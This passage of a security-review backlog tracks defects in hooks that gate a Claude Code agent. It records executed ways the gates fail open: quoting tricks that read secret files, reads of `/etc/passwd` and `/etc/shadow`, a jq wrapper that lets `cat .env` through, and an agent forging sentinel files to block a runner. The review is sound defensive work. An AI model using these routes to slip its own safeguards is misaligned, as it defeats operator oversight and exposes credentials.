| J-19 | **The empty-payload refusal overrides a hook's declared posture.** The `hook_fail` on empty stdin sits in the shared header ABOVE each hook's `FAIL_CLOSED=0` line, so `cost-log` (Stop), `task-done-alarm` (SubagentStop), `decision-required-alarm` (Notification) and `drift-detector` (PostToolUse) all exit 2 on an empty payload despite declaring themselves advisory. `exit 2` does not mean "fail closed" on a `Stop` event — it means "do not stop" — so one exit code was applied across five event semantics. Consequence is reasoned, not executed: no live Claude Code runtime was available to any round-3 lens | **FIXED 2026-07-29 (round-4 D17), and the count was wrong: it is SIX, not four.** `format-lint-gate` (PostToolUse) and `spec-gate-entry` (**UserPromptSubmit**, where `exit 2` blocks the USER'S OWN PROMPT) were missing from the list. The posture is now baked into the shared header at emission time, DERIVED from the body's own `FAIL_CLOSED=0` declaration, so there is no second list of advisory hooks to drift and a new advisory hook gets the right header automatically. Asserted directionally in `tests/test_hook_behavior.py`: an advisory hook must never return 2 on an unusable payload, a blocking gate must. The *consequence* half (what each event semantics does with each exit code) remains reasoned rather than executed — it needs a live Claude Code runtime, which no round has had | `done` |
| J-20 | **No test compares the tokenizers against a real shell.** Every one of the five review rounds has shipped a `cmd_segments` / `_sg_scan` defect, and every round's clean tokenizer result came from a hand-built corpus written by the same person who wrote the code — round 3's lens A swept 2202 generated commands and found nothing, then found two fail-opens by hand, because the generated corpus contained no multi-line quoted runs. A generative differential against `bash` word-splitting over a few hundred thousand random commands is the only mechanism any lens could name that reaches the class | **SUPERSEDED 2026-07-29 (round-4), and its PRESCRIPTION was wrong.** A differential against `bash` word-splitting would NOT have caught D1 or D2: both tokenizers agree with bash about word-splitting and disagree about command POSITION, which is downstream of it. What reaches the class is a COMPOSITION sweep — `wrapper x wrapper-flag x operand x invoker x quoting x separator x verb`, at gate level, on both substrates — now committed as `tests/composition_sweep.py` with a bounded sample running every commit in `tests/test_composition.py`. The diagnosis in this row was right (five rounds, five hand-built corpora, five missed defects); only the remedy was wrong | `done` |
| J-15 | **A nested quote inside a shell invoker's argument keeps its quote character on the word.** The round-2 quoted-run rule re-tokenizes an invoker's argument (`sh -c`, `bash -c`, `ssh`, …) so `sh -c 'cat secrets/prod.yaml'` blocks again, but the re-tokenization is a whitespace split, not a second parse — so `ssh h "git commit -m '.env'"` yields `'.env'` and over-matches. Over-match on a command that runs a shell *remotely* is the cheap direction, and the frequent case (ordinary prose in a `git commit -m`) is protected by the invoker test, which `git` fails. Closing it means recursing the tokenizer into the run, which re-opens the question of how deep to follow nesting | **REWRITTEN 2026-07-29 (round-4 D8) — as written this row was INVERTED, and it told every future reader the residual failed safe.** It claimed `ssh h "git commit -m '.env'"` OVER-matches and accepted that as the cheap direction. Executed at `b1782ec`, its own example **ALLOWS** — there was no over-match. The real behaviour was the mirror image and it was a FAIL-OPEN in the gate this repo repeatedly calls the one with no override path: `bash -c "cat secrets/prod.yaml"` denied while `bash -c "cat 'secrets/prod.yaml'"` **allowed and read the file**. One extra pair of quotes was the whole bypass, because the re-tokenization was a whitespace split and left `'secrets/prod.yaml'` glued to its quotes. Fixed by re-PARSING the invoker's argument through the scanner (depth 3, invoker test re-applied at each level) on both substrates. **The over-match this row originally described now genuinely exists**: `ssh h "git commit -m '.env'"` denies. That is accepted for the reason the row gave — the alternative is a fail-open on remote installs — and it is recorded in `docs/round-4-intended-relaxations.md` R-4b with the corpus row (QOT-34) re-pointed in the same commit | `no-action` — the trade-off is real NOW; it was not when this row was written |
| J-13 | **`npx`/`uvx`/`dlx`/`exec` blocking is new false-positive surface.** The two-lens batch newly blocks the run-without-installing channels (lens A F3 residue), which means `npx tsc` on a local devDependency now needs an entry in `deps.md`. That is the intended posture — the gate exists for "unapproved software arrives" and not installing first is not a mitigation — but it is the row most likely to generate an operator complaint, so it is recorded rather than discovered | `no-action` — revisit if it proves noisy in practice |

## K. Round-4 remediation residue (2026-07-29)

Scope of that round was **greenfield only** (owner decision, 2026-07-29).
Behaviour changes are enumerated up front in
`docs/round-4-intended-relaxations.md`; anything not on that list and not below
was a fail-open close.

| ID | Item | Notes |
|---|---|---|
| K-1 | **`mode: retrofit` was OUT OF SCOPE for round 4, and D14 is still open.** The retrofit legacy allowlist is inert in production: the preamble calls `retrofit_is_allowlisted "$TARGET"` on the raw `jget` value, while the F-1393 absolute-path normalization sits in the greenfield body *below* it. On a real retrofit install with `legacy_allowlist: ["src/**"]` and `ROLLOUT_WEEK: 4`, `src/legacy_thing.py` is exempt (rc=0) but `/abs/proj/src/legacy_thing.py` is refused (rc=2) — and absolute is the shape the harness actually sends. **This has recurred across three review rounds** for a structural reason: `mode: retrofit` has NO golden fixture and ZERO rows in the substrate differential, so it is untested by construction. Round 4 treated `tests/test_retrofit.py` (263 checks) as a TRIPWIRE only, and it stayed green | `open` — fix needs a retrofit golden fixture first, or it will recur a fourth time |
| K-2 | **`ci-mirror` has no SDK twin, and "substrate parity" is scoped to 7 of 11 gates.** `_GATE_FACTORIES` carries 7 gates against the shell's 11. Shell-only: `ci-mirror`, `drift-detector`, `cost-log`, `task-done-alarm`, `decision-required-alarm`, `spec-gate-entry`. `ci-mirror` is the one that matters — it blocks `git push` on CI failure and has **zero rows in the substrate differential**, because there is nothing to compare it against. Under `gate_substrate: sdk-callable` dispatch, `git push` is UNGATED. The emitted module's own comment says so; what was missing is that every "the substrates agree" claim in this repo silently means "the seven that both have" | `open` — either port `ci-mirror` or state the 7-of-11 scope everywhere parity is claimed |
| K-3 | **`secrets-gate` is still LINEAR in payload size, and its timeout fails CLOSED.** Round 4 made it ~2.8x cheaper on the exposed shape (per-pattern derivation hoisted out of the candidate loop; candidates de-duplicated), measured on one machine at 15.15 -> 5.43 ms/line with a 202-pattern config, which moves the 60 s `PreToolUse` crossover from ~4,000 lines to ~11,000. The MECHANISM is unchanged: a large enough Bash payload is still a hard block on benign input, in the gate with no override path. The quote-heavy single-huge-command shape the gate's own comment warns about was measured this round for the first time and is ~3x CHEAPER per unit than many-short-lines, so the linear many-lines shape is the real exposure. Closing it properly means an O(1) rejection pre-filter over the whole pattern set, which needs either `extglob` or a glob->ERE translation layer — both have their own bug surface | `open` — bounded, not closed; re-measure on the target machine |
| K-4 | **The known-defect ledger in `test_substrate_differential.py` is now EMPTY, deliberately.** Its one armed row (A10, unbalanced quote vs. the dotenv exemption) was fixed this round and retired, and the count pin moved 1 -> 0. This is the state the ledger's own comment warns about — round 3 shipped it inert, every row fixed, `ledger()` at zero call sites, and described it in the commit message as a standing guard. Recorded so the next reader knows 0 is a measurement, not a default. **Known weakness, unchanged:** deleting a row AND its count pin together is silent; the mutation tests cover either changing, not both | `no-action` — accurate as of 2026-07-29 |
| K-5 | **`WebFetch{url}` is inspected by no gate, and that is now an explicit decision rather than an omission.** Round 4 enumerated every parameter of every gated tool (D19) and added `Grep{glob}`, which was returning matching file CONTENTS through a sibling parameter of two that had already been fixed. `url` was decided the other way: it names a remote resource, not a local path, so `secrets-gate` has nothing to match it against. If a URL-shaped exfiltration channel is in scope, that is a new gate, not a new candidate | `decision` — is outbound URL an exfiltration surface this suite gates? |

## L. Round-6 / round-7 `settings.json` merge residue (2026-07-29)

Scope of those rounds was the **co-owned `settings.json` merge**, its uninstall
reversal, `verify_wiring`, the skip path and `main`. `build_plan` was untouched
throughout, so no emitted body moved.

| ID | Item | Notes |
|---|---|---|
| L-1 | **Should a symlink at a planned path BLOCK the install, and does the answer differ by file kind?** Round-6 F5 decided it for `settings.json` only: a symlinked settings.json is declined at rc=3 rather than replaced or written through, because a file shared between projects would gain `$CLAUDE_PROJECT_DIR/...` hook commands and every other project sharing it would then run scripts it does not have. Every OTHER planned path is still replaced. **The load-bearing half of that rationale does NOT transfer, which is why this was not closed by drive-by:** the generic write path is `os.replace`, so it swaps the LINK for a regular file and never writes *through* it — verified by execution; the link target keeps its bytes. The shared-file harm is therefore structurally absent there, and what remained was purely that it happened SILENTLY. **Round 7 fixed the silence only, deliberately leaving behaviour alone:** the per-file line names the link, an end-of-run block repeats it (a mid-transcript line is not a signal — a SKIP buried on stdout line 29 of 60 is exactly how the original unenforced-tree defect went unnoticed), `--dry-run` shows it in the future tense before anything is written, and the manifest records `replaced_symlink` so the displaced target is still findable once the transcript is gone. **The common case was already safe for an unrelated reason:** an *untracked* symlink is skipped because it reads as operator content, so the failure needs the narrow sequence tracked → symlinked afterwards → digest still matching → a config change that rewrites that file | `decision` — **owner, per-kind**. A symlinked hook script has a real argument for declining (a shared body would be one project's gate running everywhere); a symlinked steering doc mostly just blocks installs. A uniform rule papers over that difference, and `settings.json`'s rc=3 comes from `skipped_security`, which a doc would not trigger anyway |
| L-2 | **The legacy-migration sequence was reasoned through but never executed.** `_split_owned_hooks` accepts bare command strings from a pre-site manifest, and a legacy record is retired only when the emission no longer carries that command at all. The round-7 review traced the path — install at `844b8e0`, then run the newer installer over the same tree, with an operator foreign-site registration added in between, and again with a hook retired from the config in the same step — and concluded nothing of theirs should vanish, but did **not** run it. In a file where reading has repeatedly missed defects that execution caught, treat that as unexamined rather than clean | `open` — execute the three shapes; anyone already running this branch has such a manifest |

## M. v2.6.0 release-review residue (2026-07-30)

The review that cleared the v2.6.0 doc pair for tagging. Findings that landed in
the three documents are not listed here; these are the ones deliberately **not**
taken in that pass, because fixing them means changing the *emission* and a
documentation release should not carry an emission change.

| ID | Item | Notes |
|---|---|---|
| M-1 | **§6.D says `chmod 700` on the hooks directory; the installer emits `755`.** Executed: `.claude/hooks` is `755` and every `*.sh` is `755` on a fresh install, and no suite asserts the mode (`grep -rn '0o700\|chmod 700' tests/ lib/` is empty). Pre-existing — equally false at v2.5.0 — and the bullet was not edited at 2.6.0, so it was left in place rather than softened. Two ways to close it: tighten the emission to `700` (a real behavior change for any tooling that reads the directory as another user), or narrow the checklist bullet to what the installer actually guarantees. Prefer the former; the bullet is the correct posture | `open` |
| M-2 | **Emitted `drift-detector.sh` and `audio-alerts.config` cite `Bootstrap-Protocol-v2-5-0.md` §6.E.** Added by the v2.5.0 release review's honest-scope pass and not re-pointed at 2.6.0, so an operator reading their own emitted config is sent to the superseded document — and specifically to the one file whose bytes differ from its own tag. Cosmetic but self-defeating for a release that re-pointed every other self-reference. Part of the doc-reference-normalization pass the v2.4.0 history section already owes | `open` |
| M-3 | **The invoker-rule residue from J-1's decision.** The shared hook header still reads "KNOWN AND ACCEPTED LIMITATION … `sh -c "git commit"` … no longer matches", and the differential corpus pins the invoker rows `OPEN` rather than `want=deny`. Both now contradict the decided model and the shipped behavior. Neither is operator-facing, which is why this is a residue row and not a defect | `open` |

## N. Coverage gaps surviving the 2.6.0 batch (2026-07-30)

Found while compiling `docs/agentic-harness-security-kb.md` by executing the
v2.5.0 and v2.6.0 emissions side by side. **None is a regression** — every row is
a scope limit the upstream batch did not reach, or a gap the batch created no
worse. They are filed because they were recorded nowhere: not in the upstream
report, not in clusters A–M, and until now only in the KB's prose. Every rc below
was executed on the v2.6.0 emission at tag `v2.6.0` (`f6bded0`).

| ID | Item | Notes |
|---|---|---|
| N-1 | **The `dependency-gate` refusal names a remediation that does nothing.** It prints "Approve in-session and update `.claude/steering/deps.md`", but the approved list is baked into the hook at emission time from `deps.approved` (`mapfile -t APPROVED <<'APPROVED_EOF'`). Editing `deps.md` changes no behaviour until the installer is re-run. **Compounding:** the installer `SKIP`s a locally-modified `deps.md`, so the operator who follows the instruction also stops receiving the new refusal-class documentation. This is the KB §4.5 class — an advertised remediation path that is inert — and is the most operator-hostile survivor of the batch: the operator does the thing they were told, observes no change, and concludes the gate is broken. Fix is a choice: read `deps.md` at runtime, or change the message to name `bootstrap.config.yaml` + re-install | `open` |
| N-2 | **`dependency-gate` still does not match five ecosystems.** Executed on v2.6.0: `mix deps.get` rc=0, `rebar3 get-deps` rc=0, `opam install x` rc=0, `nimble install x` rc=0, `apt-get install x` rc=0. (`gem install x` rc=2 — Ruby *is* covered.) The upstream report named `mix` and `rebar3` explicitly under P1-3 and the fix batch closed the others around them. Elixir/Erlang are the notable miss given the report came from a BEAM-adjacent project | `open` |
| N-3 | **`secrets-gate` never inspects file *content*.** Executed: a `Write` to `notes.md` whose body is `-----BEGIN RSA PRIVATE KEY-----…` returns rc=0. The gate is a path-policy engine only. Recorded by the upstream report under P2-4 and not addressed. Whether content scanning belongs in a `PreToolUse` hook at all is a design question — the honest interim move may be to say so in `secrets.md`, which currently implies broader protection than the path list gives | `decision` — owner |
| N-4 | **No project-boundary or traversal check.** Executed: `Read ../../etc/passwd` rc=0, `Read /etc/shadow` rc=0. Paths outside the project are evaluated against the configured patterns and nothing else. Named in the upstream report under P2-4, unaddressed | `open` |
| N-5 | **`WebFetch` is on no matcher.** The emitted matcher set is `Bash`, `Read\|Write\|Edit\|NotebookEdit\|Grep\|Glob`, `Write`, `Write\|Edit`. The upstream report named `WebFetch(file://)` as an unguarded read route under P0-2; the fix added `Bash` and the file tools and left `WebFetch`. Overlaps open decision **K-5** (is `WebFetch{url}` a gated exfil surface?) — K-5 asks the policy question, N-5 records that the read-side route is also currently open | `open` — pairs with K-5 |

## O. Autonomous-mode review residue (2026-07-30)

Found by the first round that ever **executed** the emitted wrappers
(`loop.sh`, `goal-loop.sh`, `auto.sh`) rather than reading them — the surface
three prior rounds covered only by byte assertion. The four defects that round
found are fixed and pinned by `tests/test_wrapper_behavior.py` (demonstrated to
fail, 11 checks, against the pre-fix templates); D-9 and I-8 are closed above.
These are what it recorded rather than fixed.

| id | item | status |
|----|------|--------|
| O-1 | **The completion and escalation sentinels have no reader.** Executed: every reference to `.loop-complete-<id>`, `.loop-halt-<id>`, `.evaluator-feedback-<id>` and `loop-final-<id>.md` in all three wrappers is inside a **comment**; zero executable statements. Consequences: Phase 9.6's "three independent signals" claim for terminal success is untestable against the artifact (none of the three is read); the urgent-escalation halt that Phase 9.7 calls **"not configurable"** routes through `.loop-halt-<id>`, which nothing reads. Not a regression — it is the skeleton's scope — but the docs describe these as active mechanisms, which is the KB §4.5 class. **The forward-looking half matters more:** Phase 9.6 specifies that terminal success *requires* the agent's own `.loop-complete-<id>` write and "is never inferred", so when the operator completes the loop per the wrapper comments, signal one of three is a file the agent writes and nothing re-verifies. Nothing in the emitted tree constrains that and no test asserts it | `open` — pairs with I-2 |
| O-2 | **The iteration-summary hook implements none of §6.C's contract beyond presence.** `Bootstrap-Protocol-v2-6-0.md:635` specifies presence **and format-validity**, a `summary_failure_count` counter, and three consecutive format failures counting as a `goal-condition-suspect`-class halt. Emitted: `[ -s ]` only — a one-byte file passes (executed). `grep -rn summary_failure_count lib/ bin/` returns nothing. The 2026-07-30 fix corrected the hook's exit code (1 → 2, so the demand actually blocks) and bounded it with `stop_hook_active`, but the counter is per-task persistent state the Stop payload cannot scope — it carries no task or iteration identity (see I-13) — so it belongs in the operator-completed wrapper beside `loop_in_flight`, not in the hook | `open` — pairs with I-13 |
| O-3 | **Should the `exit_reason` enum gain a skeleton value?** **DECIDED 2026-07-31: NO — and the question was the wrong shape.** The enum is queue-level contract surface answering *why a RUN ended*; "the dispatch loop was never written" answers *why no run started*, and a 14th value would have put an authoring state into a run-outcome vocabulary. The wrappers now set `REFUSAL` and log `REFUSED: <cause>`, claiming no enum value at all — so the enum stays at 13, the `tests/test_usage_limit_contract.py` pin is untouched, and no protocol doc changed. Blast radius was always one `hooks.log` line: executed, the skeleton writes **no** `queue_runs_history` entry and no run-summary. Cost was freeze-exception no. 30, `full_autonomous` only | `done` |
| O-4 | **An agent can lock the queue runner out by forging `.run-active`.** Executed: writing `pid=1 start=…` (init, always alive) to `.claude/queue/.run-active` makes every subsequent `auto.sh` refuse with "A queue run is already active (pid=1)". The stale-sentinel prompt never triggers because the pid *is* alive. The direction is correct — refuse rather than run concurrently — and the refusal names the file to remove, so this is availability, not integrity. Recorded because the file is agent-writable and gitignored, which is the KB §4.1 shape, and because a runner that cannot start on an unattended night looks identical to one that finished | `open` |
| O-5 | **Cross-mode claim has a ~10% mutual-refusal livelock.** The mutual-exclusion invariant **holds** — measured with a holding body, 30 concurrent loop+goal pairs on one task id: exactly-one 27, both-held **0**. The residual 3 are runs where *both* refused: each wrapper creates its own `O_CREAT\|O_EXCL` sentinel *before* taking the `flock`, so a tight interleaving lets each see the other's sentinel under the lock and abort. Availability, not safety, and self-clearing on retry. Fix if it ever matters: claim under the same lock that guards the cross-mode check | `open` |
| O-6 | **The KB's account of what the executing suite covers reads broader than it is.** `docs/agentic-harness-security-kb.md` §5 records `tests/test_hook_behavior.py` as the answer to "why detection failed" — payloads into the emitted **hooks**, asserting exit codes. True, but the wrappers are controls too (halt sentinels, eligibility refusal, the claim protocol) and nothing executed them until 2026-07-30, so a reader finishes §5 believing the executing-suite gap was closed when it was half-closed. §6's "Residual gaps — EXECUTED" does not name the wrapper gap either, and §7's first checklist item ("every blocking control has a must-deny and a must-allow payload, both asserted against the **deployed** artifact") is exactly what the wrappers failed. **CLOSED 2026-07-31.** `tests/test_wrapper_behavior.py` exists and §5 now cites it: the section records the wrapper gap, the four defects the first executing round found, and the follow-on lesson that the suite itself could report `0 passed, 0 failed` as `ok` on a flock-less host. §6 gained a post-tag block carrying P-1..P-4 and P-17, and the KB gained P0-3d (a fourth parsing fail-open) plus §4.6. **Self-reported by the round that added that suite** | `done` |

## P. Adversarial review of the cluster-O fix batch (2026-07-31)

The independent pass on the O batch that §5.1 of the KB says every fix batch in
this repo has needed. 8 attackers, per-finding refutation, completeness critic:
45 claims raised, **23 refuted**, 22 survived. Almost every refutation turned on
one axis — *the mechanism reproduces, but it is byte-identical at the parent, so
it is not a finding against this batch*. Worth reusing: "I reproduced it" is not
"this commit caused it", and a PRE/POST execution table is what separates them.

**Two blocking defects were found and FIXED, not filed:** the `stop_hook_active`
bound tested parser *presence* rather than *usability* (root cause was `jget` in
the shared header, which failed **every parsing gate open** on a broken-but-
present `jq` — see the changelog entry for 2026-07-31), and
`tests/test_wrapper_behavior.py` reported `0 passed, 0 failed` on a flock-less
host while `bin/run-tests` scored it `ok`. Rows below are the residue.

Ordered by operator impact. `pre-existing` marks a defect the O batch did not
introduce — recorded because it is live, not because it is a regression.

| id | item | status |
|----|------|--------|
| P-1 | **The wrapper fixes are silently withheld from exactly the installs that need them.** Executed: install at the parent, append one operator line to each wrapper (which their own stderr instructs — *"Implement the dispatch loop … before any unattended use"*), re-run the installer. Both **hook** fixes land unconditionally; all three **wrapper** fixes are skipped — `SKIP .claude/loop.sh (locally modified; use --force to overwrite)` — at `rc=0`, reported as a bare `skipped=3` counter in ~70 lines of `ok`, with nothing saying a safety change was withheld. So D-9/I-8's `done` markers are conditionally false for the only population where a runtime logging defect bites: operators actually running loops. The documented remedy, `--force`, overwrites their implementation wholesale; there is no merge path. Minimum: surface withheld files distinctly from ordinary skips, and qualify the D-9/I-8 rows | `open` |
| P-2 | **The demand releases without re-checking itself, so it is a one-shot advisory, not enforcement.** Executed, three consecutive Stops with the summary never written: rc=2, then rc=0 (`stop_hook_active`), then rc=2 on a fresh turn. The bound sits *above* the summary check, so turn 2 ends whether or not the agent complied. Combined with O-2 (no `summary_failure_count`), the gate costs one extra turn per iteration and enforces nothing across turns — while `goal-config.md` emits `summary_failure_halt_threshold: 3` promising a halt nothing reads. The exit-code fix made the gate *audible*, not *enforcing*; the docs should say which | `open` — pairs with O-2 |
| P-3 | **The durable record is inverted: the block logs nothing, the release logs.** Across the same three Stops, `hooks.log` contains exactly one line — `stop_hook_active; not re-blocking`. Every allow path logs; the exit-2 enforcement branch is the only silent outcome in the hook. A morning-after operator sees the gate declining to act, with no record that it ever acted. `pre-existing` in mechanism (the branch had no `log` at exit 1 either), but the O batch is what made that branch a *control action* rather than a no-op | `open` — `pre-existing` |
| P-4 | **Nothing in the emitted tree teaches the agent the summary contract.** Executed grep over a full install: `.iteration-summary-*` appears only in the hook itself, `.claude/.gitignore` and `settings.json` — not in `goal-config.md`, `CLAUDE.md`, `goal-loop.sh`, or any skill or command. The path, name and required contents are stated exactly once, in the stderr of the block, which is delivered the turn before the bound stops enforcing it. An agent that has never been told the filename cannot satisfy the gate on the turn where satisfying it matters | `open` |
| P-5 | **A non-empty but unparseable payload still defeats the bound.** The `parser_ok` self-test proves a parser *works*; it does not prove *this payload parsed*. With truncated JSON, or valid JSON that is not an object, `jget` returns empty, `stop_hook_active` cannot read true, and the hook exits 2. Narrower than the broken-parser case now fixed (it needs a malformed payload from the harness, not a broken host) but it is the same shape and the same file. Fix: distinguish "parsed, key absent" from "did not parse" — the degrade branch already exists and is correct | `open` |
| P-6 | **The Stop gate is armed install-wide by a stale or forged marker, and nothing reaps them.** `SID` is computed and never read; the gate globs `.claude/sessions/.goal-active-*` with no session, task, pid-liveness or mtime scoping; the file is gitignored and agent-writable. After one hard-killed goal run, every ordinary interactive Stop in that project costs an extra turn. Bounded to one turn by the working bound, and the wrapper's refusal is self-announcing, so this is cost, not lockout — but the O batch is what turned it from `rc=1` into `rc=2`. Same shape as I-13 | `open` — pairs with I-13 |
| P-7 | **The revived tier-3 cooperation point over-fires on stale sentinels.** The glob split fixed the under-match; the globs stay project-scoped. One `.loop-active-*` left by a crashed run makes the branch fire in a session that is in no loop at all — pre-fix this needed two sentinels, post-fix one suffices, so the fix widened the stale-sentinel window it inherited. Advisory and `rc=0`, so the ceiling is noise; the hook is on `PostToolUse` with no matcher, so "noise" means every tool call while the sentinel exists | `open` |
| P-8 | **No wrapper has a reachable `exit 0` any more, so a zero-backoff retry supervisor now spins.** Executed: `until .claude/auto.sh; do :; done` terminated after one iteration at the parent and never terminates after (336 iterations in 5 s). No shipped component prescribes that pattern and `systemd Restart=on-failure` bounds it at defaults, so this is latent rather than instructed — and the direction (silent success → loud failure) is the improvement. Recorded because the wrappers also write to `hooks.log` with **no size cap**, while every emitted *hook* carries `_rotate_log` written because that file "grew without bound"; a wrapper-only spin fires no hook and so never rotates | `open` |
| P-9 | **Eight refusal causes, one exit code.** **DECIDED 2026-07-31: keep one code, distinguish in the log.** Exit 1 = refused (see the `REFUSED:` line); 0 = the run ended (see `exit_reason`). The 0–255 space is already spoken for at 126/127/128+n and `auto.sh` itself exits 130 on SIGINT, so a custom code map risks colliding with shell convention — and executed, **no mechanical consumer of a wrapper's exit status exists anywhere** in the repo or the emitted tree. The wrapper header now documents the eight causes and states that an operator-completed implementation MAY subdivide, and should document its map there if it does | `done` |
| P-10 | **O-3's stated blocker is over-scoped.** **CONFIRMED and superseded 2026-07-31.** Correct, and understated: the `exactly 13` pin reads `body(AUTO)` only, but the *protocol itself* scopes the enum to the queue runner — `Bootstrap-Protocol-v2-6-0.md:283`, *"successful per-task terminations (`max-iterations`, `goal-condition-suspect`, `terminal-success`) do not produce a queue-level `exit_reason`"*. So for `loop.sh`/`goal-loop.sh` there was never a contract question. Acting on it found a live defect P-10 did not predict: those two were logging `goal-condition-suspect` for a missing task file, an ineligible task and an already-claimed task — a goal-mode reason on `loop.sh`, which has no goal. Fixed with O-3 | `done` |
| P-11 | **Two more vacuous check-pairs, same shape as the ones repaired.** `tests/test_installer.py:363` (`F-2: auto.sh cleans .run-active sentinel`) and `:526` (`W-1: loop.sh cleans its active sentinel on exit`) both assert `not os.path.exists(...)` and pass **vacuously** on a flock-less host, where the wrapper dies at the flock guard long before the sentinel is created. A negative existence check that a refusal path satisfies for free tests nothing on that substrate | `open` — `pre-existing` |
| P-12 | **`test_auto_run_sentinel.py` (ii) no longer proves the run proceeded past the cleared sentinel.** The rewrite dropped `rc == 0` for two stderr substrings and did not replace what that assertion carried. Executed: inserting `exit 1` immediately after the stale-sentinel clear, before the `O_CREAT\|O_EXCL` claim, leaves the entire suite green. The alert-then-clear half is still pinned; the *and then it ran* half is not | `open` |
| P-13 | **The drift fix's justifying comment reasons from a task-scoped premise to a project-scoped conclusion.** It argues the old condition "could never fire in normal single-mode operation" because "a task is in exactly one mode — the wrappers enforce that". The wrappers' guard is `$TASK_ID`-scoped; the hook's globs are project-wide. One loop task and one goal task running concurrently is supported by design and *did* fire the old condition. The fix is right; the recorded reason for it is not, and a future reader auditing the glob will be misled about what it is for | `open` |
| P-14 | **The newly-blocking Stop hook has no timeout.** Four of the eight blocking gates carry one (`secrets-gate` 60, `test-gate` 600, `ci-mirror` 900, `format-lint` 120). Executed: with stdin held open, both Stop hooks are still running at 5 s. Shared-header property, identical on `cost-log.sh`, unchanged by this batch — but `iteration-summary-enforcement` is now the only Stop-family hook that can *block*, which is what makes an unbounded runtime matter. The harness's disposition toward a timed-out hook (kill-and-allow vs kill-and-block) was **not** established and should be, before deciding | `open` — `pre-existing` |
| P-15 | **The summary gate's two `ls`/`head` forks sit in `set -e`-exempt contexts.** `if ! ls …` and `latest="$(ls -t … \| head -1 \|\| true)"` are both exempt from the ERR trap, so a missing coreutil flips the gate silently — without `head` a *satisfied* gate blocks; without `ls` the gate is inert. Same T-1 class the header says was designed out of the command matcher and never applied to these. Both predate the batch | `open` — `pre-existing` |
| P-16 | **The retrofit `.gitignore` omits the lock file the retrofit wrappers actually create.** It carries a dead `.bootstrap-state.json.lock` and not `.retrofit-state.json.lock`, which the retrofit-transformed `loop.sh`/`goal-loop.sh` create via `exec 9>"$STATE.lock"`. Executed: `git add -A` stages it | `open` — `pre-existing` |
| P-17 | **The substrate-differential suite cannot detect a shell control with no SDK twin, by construction.** Every parity assertion iterates `SDK_GATES` — the smaller side — so a shell hook absent from the SDK is invisible to it. Confirmed by execution: adding an always-deny shell hook with no SDK counterpart left both parity suites at 176/0 and 96/0. This is why neither changed hook's absence from `lib/sdk_gates_template.py` registered anywhere. The SDK is a strict 7-of-15 subset and that may be correct — but the suite that reports parity should be able to say so, rather than being structurally blind to the difference | `open` |
| P-18 | **10 backlog rows still carry more cells than their table header**, so their trailing cell is dropped by GFM rendering. Measured counting only *unescaped* pipes — a `\|` inside a row is content, not a delimiter, which is why a naive count reports more. The two rows this batch introduced (D-9, I-8) and section D's stale "All `open`" caption are fixed; the remainder predate it: **A-5, A-6** (4 cells / 3), **I-11** (4/3), **J-1** (5/3), **J-10, J-17, J-19, J-20, J-15** (4/3) and **J-18** (7/3). A status silently dropped from a tracking file is how a `done` row gets re-worked | `open` — `pre-existing` |
| P-19 | **P0-3d's fix tests that the parser exited clean, not that it parsed — so a same-named different tool still fails the gates open.** `jget` accepts a parser's output whenever the pipeline's status is 0. Anything named `jq` that exits 0 without producing a parse is therefore read as a successful *empty* parse, and the gate's `case` falls through to allow. The realistic substrate is not an exotic tool but a **defensive wrapper over a broken jq** — `real-jq "$@" 2>/dev/null \|\| true; exit 0`, which is the same `\|\| true` idiom the P0-3d fix removed from `jget`, one layer out, in a file the operator owns. Executed against the emitted install with a healthy `python3` on the same PATH: `secrets-gate` on `cat .env` **rc=0 ALLOWED**, `dependency-gate` on `npm install evil` **rc=0 ALLOWED**, while jq absent / exiting 127 / `chmod 644` all give rc=2. **Bounded honestly:** two neighbouring shapes DENY and are not part of this — a swallowing wrapper over a *working* jq (the real answer is still returned) and a wrapper that prepends a banner to stdout (the polluted output still contains the command). §4.6's stated remedy is the capability probe — parse a known literal and compare — which the fix does not implement. Found reviewing PR #24, whose §7 checklist item claimed all four shapes already denied; that item now states the gap instead | `open` |

## W. Worktree isolation (issue #29, 2026-07-31)

The issue observed that this document had **no worktree entry at all**. It has
one now. W-1 itself is fixed; the rows below are the residue.

| ID | Item | Status |
|---|---|---|
| W-1 | **Worktree isolation and container-executed commands did not compose — gates tested the wrong tree, silently.** `isolation: worktree` was hardcoded on `implementer` while Phase 2 collected commands with no constraint on where they run, so under fixed-mount indirection (`docker compose exec`, `kubectl exec`, `ssh`, devcontainer CLIs) the gate compiled the main checkout while the agent worked in a worktree — green on code never built. Fixed with `commands.execute_in_cwd` + `workflow.implementer_isolation`; see `docs/changelog.md` | `done` |
| W-1a | **The load-bearing assumption is documented, not executed.** That Claude Code sets an `isolation: worktree` subagent's cwd to its worktree is taken from the tooling docs; W-1's fix was NOT gated on confirming it by running an implementer task. Direction of risk is favorable — if it were untrue the pairing would fail *more* broadly (every command, not just fixed-mount ones), so the mitigation is directionally right either way — and the emitted `implementer.md` now ships a one-command probe so each operator can settle it locally. What is still missing is one execution on this side: dispatch one `implementer` task and record where its test command ran | `open` |
| W-1b | **`worktree-budget.md` (G16) and the isolation decision do not consult each other.** The retrofit budget doc advises sequential over parallel worktrees above 5 GB; `_resolve_implementer_isolation` never reads `codebase_size_gb`. Two separate levers over the same behavior, each unaware of the other. Not wrong today (the budget doc is advisory prose to the agent, the config key is mechanical), but an operator can set `implementer_isolation: worktree` on a 20 GB repo and get no pushback from either | `open` |
| W-1c | **No gate asserts that a gate ran where the agent worked.** W-1 closes the configuration path into the fail-open; it does not detect the fail-open. A gate could compare its own `pwd` against `$CLAUDE_PROJECT_DIR` (or record it in `hooks.log`) so a mismatch is observable rather than inferred from a config key an operator may have answered wrong. This is the mechanical check that would have caught the defect without anyone reasoning about mounts | `open` |

## X. Issues #30–#33 residue (2026-07-31)

Four issues filed against 2.6.1 alongside #29. All four are FIXED; the rows
below are what the fixes deliberately did not do, plus defects found while
fixing them.

**Read the `X-31`/`X-32` rows with §4.9 of the security KB in hand.** Both
issues were *usability* reports (over-refusal, error in the safe direction) and
**both fixes introduced under-blocks** that only an adversarial re-run caught.
One of those under-blocks was pinned as correct in four suites.

| ID | Item | Status |
|---|---|---|
| X-30 | **The alarm hook truncated the escalation record it is documented to preserve.** `: >"$P"` on every fire, so all `.decision-pending-*` files were 0 bytes and a halted overnight loop delivered a filename and no reason. Fixed hook-side (create-if-absent + `touch`), which keeps the documented four-field contract true. Doc surfaces at §6.E, Phase 8, Phase 9.5, both Companions now state the never-truncate requirement | `done` |
